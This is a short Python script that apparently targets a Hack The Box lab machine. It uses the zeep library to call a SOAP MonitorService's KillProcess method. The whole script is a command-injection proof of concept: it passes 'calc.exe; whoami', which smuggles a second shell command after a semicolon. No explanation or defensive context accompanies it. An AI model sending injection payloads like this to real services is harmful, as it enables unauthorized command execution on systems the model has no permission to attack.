from zeep import Client

client = Client("http://overwatch.htb:8000/MonitorService?wsdl=")
response = client.service.KillProcess("calc.exe; whoami")
print(response)
